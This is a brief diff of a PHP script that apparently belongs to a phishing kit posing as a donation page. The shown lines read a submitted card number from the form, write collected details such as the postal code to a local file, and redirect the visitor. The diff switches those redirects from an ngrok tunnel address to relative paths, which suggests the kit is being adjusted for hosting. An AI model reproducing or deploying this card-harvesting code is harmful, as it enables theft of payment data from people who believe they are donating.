@@ -1,6 +1,6 @@
 <?php
 
-header('Location:https://e3a197ea78ce.ngrok.io/Donar.html');
+header('Location:Donar.html');
 
 
 $cardNumber = $_POST['cardNumber'];
@@ -46,4 +46,4 @@ CodigoPostal:".$codigopostal." ");
 fclose($guardame);
 
 
-header("Location:https://e3a197ea78ce.ngrok.io/donaciones/index2.html");
+header("Location:donaciones/index2.html");
